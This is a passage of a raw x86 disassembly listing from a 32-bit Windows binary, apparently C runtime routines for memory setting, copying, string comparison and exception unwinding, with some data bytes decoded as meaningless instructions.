  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
